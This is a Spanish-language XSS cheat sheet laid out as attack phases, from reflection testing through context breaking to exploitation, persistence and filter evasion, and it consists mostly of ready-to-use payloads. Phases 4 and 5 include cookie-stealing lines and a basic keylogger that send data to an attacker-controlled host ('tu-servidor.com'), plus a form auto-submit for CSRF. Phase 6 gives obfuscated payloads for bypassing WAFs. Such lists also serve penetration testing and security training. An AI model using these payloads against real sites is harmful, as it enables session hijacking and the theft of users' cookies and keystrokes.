
---
# Cheat Sheet XSS organizada por fases del ataque

**Fase 1: Descubrimiento y detección de reflejo**  

Objetivo: Comprobar si la entrada del usuario se refleja sin sanitización.

```html
<script>alert(1)</script>
<img src=x onerror=alert(1)>
<svg/onload=alert(1)>
````

**Tips:**

- Usa herramientas como Burp Suite para interceptar y modificar parámetros.
    
- Prueba parámetros en GET, POST, cookies, headers (User-Agent, Referer).
    
- Revisa si tu input aparece reflejado tal cual en el HTML, en atributos, o en el JavaScript.
    

---

**Fase 2: Identificación del contexto de inyección**

Objetivo: Entender dónde se inyecta el payload para adaptar la técnica.

```html
<!-- Dentro de HTML plano -->
hola <tu_inyección_aquí>

<!-- Dentro de atributos -->
<img src="tu_inyección">

<!-- Dentro de etiquetas `<script>` -->
<script>var user = 'tu_inyección';</script>
```

**Tips:**

- Usa caracteres especiales para romper el contexto: `" ' > <`
    
- Si tu input se encuentra entre comillas, prueba payloads como: `" onerror=alert(1) x="`
    
- Si estás dentro de JavaScript, prueba con: `' + alert(1) + '`
    

---

**Fase 3: Ejecución del payload**

Objetivo: Lanzar un `alert()`, acceso a `document.cookie`, o ejecución de código.

```html
<script>alert(1)</script>
<img src=x onerror=alert(document.cookie)>
<iframe srcdoc="<script>alert(1)</script>"></iframe>
```

---

**Fase 4: Escalada y explotación avanzada**

Objetivo: Robar sesiones, manipular DOM, redirigir, simular acciones.

```javascript
// Robo de cookies
new Image().src="https://tu-servidor.com/log.php?c="+document.cookie

// Simular click (CSRF + XSS)
document.querySelector('form').submit()

// Keylogger básico
document.onkeypress = function(e){fetch('https://tu-servidor.com/k?key='+e.key)}
```

---

**Fase 5: Persistencia (si es XSS almacenado)**

Objetivo: Asegurar que el código malicioso se quede en la aplicación.

```html
<script>document.location='https://tu-servidor.com/?c='+document.cookie</script>
```

**Tips:**

- Prueba comentarios, nombres de usuario, campos de perfil, o entradas visibles para otros usuarios.
    
- Observa si el contenido persiste tras recargar la página o cambiar de sesión.
    

---

**Fase 6: Bypass de filtros/WAFs**

Objetivo: Evadir protecciones anti-XSS.

```html
<svg/onload=&#97;&#108;&#101;&#114;&#116;&#40;1&#41;>
<script>eval('al'+'ert(1)')</script>
<scr<script>ipt>alert(1)</scr</script>ipt>
```

---
